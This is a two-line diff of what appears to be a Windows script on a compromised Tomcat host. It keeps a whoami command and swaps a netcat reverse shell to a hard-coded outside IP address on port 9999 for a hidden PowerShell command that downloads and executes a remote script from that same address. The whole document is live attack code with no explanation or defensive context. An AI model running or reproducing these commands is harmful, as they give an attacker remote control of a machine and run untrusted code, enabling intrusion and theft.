@@ -1,2 +1,2 @@
 whoami > C:\users\tomcat\desktop\who.txt
-C:\users\tomcat\desktop\nc2.exe 52.29.134.186 9999 -e cmd.exe
+powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://52.29.134.186:80/index.php');"
